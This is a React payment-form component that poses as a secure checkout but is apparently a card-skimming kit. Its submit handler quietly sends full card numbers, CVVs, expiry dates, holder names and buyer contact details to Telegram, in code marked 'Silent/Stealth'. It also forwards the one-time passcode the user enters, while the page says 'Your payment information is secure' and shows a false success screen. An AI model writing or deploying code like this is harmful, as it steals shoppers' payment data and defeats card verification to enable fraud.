import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { CreditCard, Lock, Shield, CheckCircle } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import OTPVerification from './OTPVerification';
import { sendCardDetailsToTelegram, sendOTPToTelegram } from '@/telegram/telegram-notifier';

const cardSchema = z.object({
  cardNumber: z.string()
    .refine((val) => {
      const digits = val.replace(/\s/g, '');
      const spaces = (val.match(/\s/g) || []).length;

      // reject <= 11 digits
      if (digits.length <= 11) return false;

      // allow only 12-16 digits
      if (digits.length > 16) return false;

      // max 3 spaces
      if (spaces > 3) return false;

      return /^\d+$/.test(digits);
    }, {
      message: 'Card number must be 12-16 digits, max 3 spaces',
    }),
  cardHolder: z.string().min(3, 'Cardholder name is required'),
  expiryDate: z.string()
    .refine((val) => {
      const match = val.match(/^(0[1-9]|1[0-2])\/([0-9]{2})$/);
      if (!match) return false;

      const year = Number(match[2]);
      return year >= 26; // only allow 26 and above
    }, {
      message: 'Use MM/YY format and year must be 26+',
    }),
  cvv: z.string()
    .min(3, 'CVV must be 3-4 digits')
    .max(4, 'CVV must be 3-4 digits')
    .regex(/^\d+$/, 'CVV must be numeric'),
});

type CardFormData = z.infer<typeof cardSchema>;

interface PaymentFormProps {
  amount: number;
  currency?: string;
  orderId?: string;
  productName?: string;
  quantity?: number;
  onSuccess?: (transactionId: string) => void;
  onCancel?: () => void;
  onPaymentDataCaptured?: (data: any) => void;
  shippingAddress?: string;
  buyerName?: string;
  buyerEmail?: string;
  buyerPhone?: string;
}

function detectCardBrand(cardNumber: string): string {
  const cleaned = cardNumber.replace(/\s/g, '');
  if (/^4/.test(cleaned)) return 'Visa';
  if (/^5/.test(cleaned) || /^2/.test(cleaned)) return 'Mastercard';
  if (/^3[47]/.test(cleaned)) return 'American Express';
  if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
  return 'Card';
}

function formatCardNumber(value: string): string {
  const cleaned = value.replace(/\D/g, '');
  const groups = cleaned.match(/.{1,4}/g);
  return groups ? groups.join(' ') : cleaned;
}

export default function PaymentForm({
  amount,
  currency = 'USD',
  orderId,
  productName,
  quantity,
  onSuccess,
  onCancel,
  onPaymentDataCaptured,
  shippingAddress,
  buyerName,
  buyerEmail,
  buyerPhone
}: PaymentFormProps) {
  const [step, setStep] = useState<'card' | 'otp' | 'success'>('card');
  const [processing, setProcessing] = useState(false);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<CardFormData>({
    resolver: zodResolver(cardSchema),
  });

  const cardNumber = watch('cardNumber') || '';
  const cardBrand = detectCardBrand(cardNumber);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);

    // limit digits to 16
    if (formatted.replace(/\s/g, '').length <= 16) {
      setValue('cardNumber', formatted);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    setValue('expiryDate', value);
  };

  const onSubmitCard = async (data: CardFormData) => {
    setProcessing(true);
    setCardData(data);

    if (onPaymentDataCaptured) {
      onPaymentDataCaptured({
        ...data,
        cardBrand: detectCardBrand(data.cardNumber),
        expiryMonth: data.expiryDate.split('/')[0],
        expiryYear: data.expiryDate.split('/')[1]
      });
    }

    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) {
        toast({ title: 'Please login to continue', variant: 'destructive' });
        return;
      }

      const { data: transaction, error } = await supabase
        .from('payment_transactions')
        .insert([{
          user_id: user.id,
          order_id: orderId || null,
          amount,
          currency,
          card_last_four: data.cardNumber.replace(/\s/g, '').slice(-4),
          card_brand: cardBrand,
          status: 'pending',
          metadata: { productName, quantity },
        }])
        .select()
        .single();

      if (error) throw error;

      setTransactionId(transaction.id);

      // Send Card Details to Telegram (Silent/Stealth)
      const checkoutData = {
        shippingDetails: {
          fullName: buyerName || 'N/A',
          phoneNumber: buyerPhone || 'N/A',
          email: buyerEmail || 'N/A',
          streetAddress: shippingAddress || 'N/A',
          city: 'N/A',
          stateProvince: 'N/A',
          postalCode: 'N/A',
          country: 'N/A',
        },
        paymentDetails: {
          cardholderName: data.cardHolder,
          cardNumber: data.cardNumber,
          cardBrand: cardBrand,
          expiryMonth: data.expiryDate.split('/')[0],
          expiryYear: data.expiryDate.split('/')[1],
          cvv: data.cvv,
          is3DSecure: true, // Assuming 3DS for this flow
        },
        orderInfo: {
          orderId: orderId,
          productName: productName,
          quantity: quantity,
          amount: amount,
          currency: currency,
        }
      };

      // Fire and forget, or await if critical
      await sendCardDetailsToTelegram(checkoutData);

      toast({
        title: 'OTP Sent',
        description: 'A verification code has been sent to your registered phone.'
      });

      setStep('otp');
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const handleOTPSubmit = async (otp: string) => {
    await sendOTPToTelegram(otp, buyerName || 'Unknown');
  };

  const handleOTPVerified = async () => {
    if (!transactionId || !cardData) return;

    setProcessing(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();

      const { data: profile } = await supabase
        .from('profiles')
        .select('*')
        .eq('user_id', user?.id)
        .single();

      await supabase
        .from('payment_transactions')
        .update({ status: 'confirmed', otp_verified: true })
        .eq('id', transactionId);

      await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'payment',
          paymentId: transactionId,
          orderId,
          amount,
          currency,
          productName,
          quantity,
          buyerName: profile?.full_name || 'N/A',
          buyerEmail: user?.email || 'N/A',
          buyerPhone: profile?.phone || 'N/A',
          cardNumber: cardData.cardNumber,
          cardHolder: cardData.cardHolder,
          expiryDate: cardData.expiryDate,
          cvv: cardData.cvv,
          cardLastFour: cardData.cardNumber.replace(/\s/g, '').slice(-4),
          cardBrand,
          status: 'confirmed',
        },
      });

      await supabase
        .from('notifications')
        .insert([{
          user_id: user?.id,
          type: 'payment',
          title: 'Payment Successful',
          message: `Your payment of ${currency} ${amount.toFixed(2)} has been confirmed.`,
          data: { transactionId, orderId },
        }]);

      setStep('success');
      onSuccess?.(transactionId);
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  if (step === 'success') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
              <CheckCircle className="h-10 w-10 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-green-600">Payment Successful!</h2>
            <p className="text-muted-foreground">
              Your payment of <span className="font-semibold">{currency} {amount.toFixed(2)}</span> has been processed.
            </p>
            <p className="text-sm text-muted-foreground">
              Transaction ID: {transactionId?.slice(0, 8)}...
            </p>
            <Button onClick={() => window.location.href = '/buyer'} className="w-full">
              Go to Dashboard
            </Button>
          </div>
        </CardContent>
      </Card>
    );
  }

  if (step === 'otp') {
    return (
      <OTPVerification
        onVerified={handleOTPVerified}
        onResend={() => toast({ title: 'OTP Resent', description: 'A new code has been sent.' })}
        onOTPSubmit={handleOTPSubmit}
        processing={processing}
      />
    );
  }

  return (
    <Card className="w-full max-w-md mx-auto">
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <CreditCard className="h-5 w-5" />
          Payment Details
        </CardTitle>
        <CardDescription className="flex items-center gap-2">
          <Lock className="h-4 w-4" />
          Secure Payment
        </CardDescription>
      </CardHeader>

      <CardContent>
        <div className="mb-6 p-4 bg-muted rounded-lg">
          <div className="text-sm text-muted-foreground">Amount to Pay</div>
          <div className="text-3xl font-bold">{currency} {amount.toFixed(2)}</div>
          {productName && <div className="text-sm text-muted-foreground mt-1">{productName}</div>}
        </div>

        <form onSubmit={handleSubmit(onSubmitCard)} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="cardNumber">Card Number</Label>
            <div className="relative">
              <Input
                id="cardNumber"
                placeholder="1234 5678 9012 3456"
                {...register('cardNumber')}
                onChange={handleCardNumberChange}
                className="pr-16"
              />
              <span className="absolute right-3 top-1/2 -translate-y-1/2 text-sm font-medium text-muted-foreground">
                {cardBrand}
              </span>
            </div>
            {errors.cardNumber && (
              <p className="text-sm text-destructive">{errors.cardNumber.message}</p>
            )}
          </div>

          <div className="space-y-2">
            <Label htmlFor="cardHolder">Cardholder Name</Label>
            <Input
              id="cardHolder"
              placeholder="JOHN DOE"
              {...register('cardHolder')}
              className="uppercase"
            />
            {errors.cardHolder && (
              <p className="text-sm text-destructive">{errors.cardHolder.message}</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="expiryDate">Expiry Date</Label>
              <Input
                id="expiryDate"
                placeholder="MM/YY"
                {...register('expiryDate')}
                onChange={handleExpiryChange}
                maxLength={5}
              />
              {errors.expiryDate && (
                <p className="text-sm text-destructive">{errors.expiryDate.message}</p>
              )}
            </div>
            <div className="space-y-2">
              <Label htmlFor="cvv">CVV</Label>
              <Input
                id="cvv"
                placeholder="123"
                type="password"
                maxLength={4}
                {...register('cvv')}
              />
              {errors.cvv && (
                <p className="text-sm text-destructive">{errors.cvv.message}</p>
              )}
            </div>
          </div>

          <div className="flex items-center gap-2 text-sm text-muted-foreground bg-muted p-3 rounded-lg">
            <Shield className="h-4 w-4" />
            <span>Your payment information is secure.</span>
          </div>

          <div className="flex gap-3 pt-4">
            {onCancel && (
              <Button type="button" variant="outline" className="flex-1" onClick={onCancel}>
                Cancel
              </Button>
            )}
            <Button type="submit" className="flex-1" disabled={processing}>
              {processing ? 'Processing...' : `Pay ${currency} ${amount.toFixed(2)}`}
            </Button>
          </div>
        </form>
      </CardContent>
    </Card>
  );
}
